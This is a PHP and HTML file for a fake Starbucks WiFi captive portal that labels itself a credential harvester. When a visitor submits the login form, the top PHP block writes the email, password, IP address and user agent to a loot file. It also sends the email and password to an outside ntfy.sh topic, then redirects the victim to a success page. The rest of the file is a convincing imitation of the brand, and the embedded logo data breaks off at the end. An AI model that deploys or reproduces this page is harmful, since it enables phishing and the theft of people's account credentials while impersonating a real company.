<?php
// GARMR Starbucks Portal - Credential Harvester
$loot_file = "/root/loot/garmr/credentials.txt";
$ntfy_topic = trim(@file_get_contents("/root/.garmr_ntfy_topic"));

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = isset($_POST["email"]) ? $_POST["email"] : "";
    $password = isset($_POST["password"]) ? $_POST["password"] : "";
    $timestamp = date("Y-m-d H:i:s");
    $ip = $_SERVER["REMOTE_ADDR"];
    $ua = $_SERVER["HTTP_USER_AGENT"];
    @mkdir(dirname($loot_file), 0755, true);
    $entry = "[$timestamp] STARBUCKS | IP: $ip | Email: $email | Pass: $password | UA: $ua\n";
    file_put_contents($loot_file, $entry, FILE_APPEND | LOCK_EX);
    
    // NTFY via curl - reads topic from config file
    if (!empty($ntfy_topic)) {
        $msg = "☕ STARBUCKS CREDS\n📧 $email\n🔑 $password\n🌐 $ip";
        // PHP native curl (shell_exec unreliable)
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://ntfy.sh/$ntfy_topic");
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $msg);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ["Title: GARMR Creds", "Priority: high", "Tags: key,rotating_light"]);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_exec($ch);
        curl_close($ch);
        
    }
    
    header("Location: /success.html");
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Starbucks WiFi</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1e3932 0%, #00704A 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 16px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }
        .logo {
            width: 120px;
            height: 120px;
            margin: 0 auto 20px;
        }
        .logo img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }
        h1 {
            color: #1e3932;
            font-size: 24px;
            margin-bottom: 8px;
            font-weight: 600;
        }
        .subtitle {
            color: #666;
            margin-bottom: 30px;
            font-size: 14px;
        }
        .form-group {
            margin-bottom: 16px;
            text-align: left;
        }
        label {
            display: block;
            color: #1e3932;
            font-size: 14px;
            margin-bottom: 6px;
            font-weight: 500;
        }
        input[type="email"], input[type="password"] {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.2s;
        }
        input:focus {
            outline: none;
            border-color: #00704A;
        }
        button {
            width: 100%;
            padding: 16px;
            background: #00704A;
            color: white;
            border: none;
            border-radius: 25px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.2s;
        }
        button:hover {
            background: #1e3932;
        }
        .rewards {
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #e0e0e0;
            font-size: 13px;
            color: #666;
        }
        .rewards strong {
            color: #00704A;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="data:image/png;base64,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